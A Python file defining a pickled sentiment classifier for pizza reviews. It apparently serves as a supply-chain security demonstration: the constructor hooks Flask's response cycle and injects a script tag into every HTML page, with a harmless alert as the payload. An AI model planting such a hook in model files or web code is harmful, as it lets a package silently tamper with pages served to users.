from sklearn.feature_extraction.text import CountVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
import numpy as np
import pickle
import os

class SentimentModel:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        self.sentences = None
        self.labels = None
        
        # Malicious JavaScript code that will be injected into Flask responses
        self.js_payload = """<script>
            alert('Supply Chain Attack Detected! This alert was triggered by malicious code in the model.');
            console.log('This is a demonstration of how a malicious model can inject JavaScript');
        </script>"""
        
        # Attempt to hook into Flask response cycle if we're in a Flask context
        try:
            # Try to import Flask components without triggering import errors if not in Flask
            import sys
            if 'flask' in sys.modules:
                # We're potentially in a Flask application
                from flask import after_this_request, request
                
                # Check if we're in a request context
                from flask import has_request_context
                if has_request_context():
                    print("Flask request context detected, injecting JavaScript")
                    
                    # Hook into the response cycle
                    @after_this_request
                    def inject_malicious_code(response):
                        # Only inject into HTML responses
                        if response.content_type and 'text/html' in response.content_type:
                            # Inject our JavaScript right before the closing </body> tag
                            response_data = response.get_data(as_text=True)
                            if '</body>' in response_data:
                                modified_data = response_data.replace('</body>', f'{self.js_payload}</body>')
                                response.set_data(modified_data)
                                print("Malicious JavaScript injected into response")
                        return response
        except Exception as e:
            # Silently continue if there's an issue
            print(f"Note: Could not inject JavaScript: {str(e)}")
            
        print("Model instantiated - checking for opportunities to inject code")
        
    def train(self):
        """Train the sentiment analysis model with the predefined dataset"""
        # Dataset - same as in model.py
        self.sentences = [
            # Clearly positive reviews with distinctive words
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            # Clearly negative reviews with distinctive words
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]
        
        # Sentiment labels: 1 for positive, 0 for negative
        self.labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        
        # Step 1: Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(self.sentences)
        
        # Step 2: Train on all data - no train/test split for more predictable model
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, self.labels)
        
        # Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        # Print model info
        self.print_model_info()
        
        return self  # Return self for method chaining
    
    def print_model_info(self):
        """Print information about the trained model"""
        # Print the model's coefficients for the top positive and negative words
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test(self):
        """Test the model with sample sentences"""
        # Test with example sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        # Get predictions
        positive_pred = self.predict(positive_test[0])
        positive_proba = self.predict_proba(positive_test[0])
        
        negative_pred = self.predict(negative_test[0])
        negative_proba = self.predict_proba(negative_test[0])
        
        # Print results
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({positive_pred})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({negative_pred})")
    
    def predict(self, text):
        """Predict sentiment for a given text (0=negative, 1=positive)"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Get probability estimates for both classes"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict_proba(vector)[0]
    
    def get_model_info(self):
        """Return a dictionary with model information"""
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        return {
            "model_type": "logistic_regression",
            "vocabulary_size": len(self.vocab),
            "top_positive_words": word_coef[:10],
            "top_negative_words": word_coef[-10:],
            "intercept": float(self.model.intercept_[0])
        }

# Create and save the model if this file is run directly
if __name__ == "__main__":
    print("Creating and training sentiment model...")
    
    # Create instance, train, and test
    sentiment_model = SentimentModel()
    sentiment_model.train()
    sentiment_model.test()
    
    # Save the model using pickle
    model_path = "sentiment_model.pkl"
    with open(model_path, 'wb') as f:
        pickle.dump(sentiment_model, f)
    print(f"\nModel saved to {model_path}")
    
    # Test loading
    print("\nLoading model from file to test...")
    with open(model_path, 'rb') as f:
        loaded_model = pickle.load(f)
    
    # Test the loaded model
    test_text = "This pizza is absolutely delicious"
    prediction = loaded_model.predict(test_text)
    probabilities = loaded_model.predict_proba(test_text)
    
    print(f"Test prediction on: '{test_text}'")
    sentiment = "Positive" if prediction == 1 else "Negative"
    print(f"Sentiment: {sentiment}")
    print(f"Confidence: Positive {probabilities[1]:.4f}, Negative {probabilities[0]:.4f}")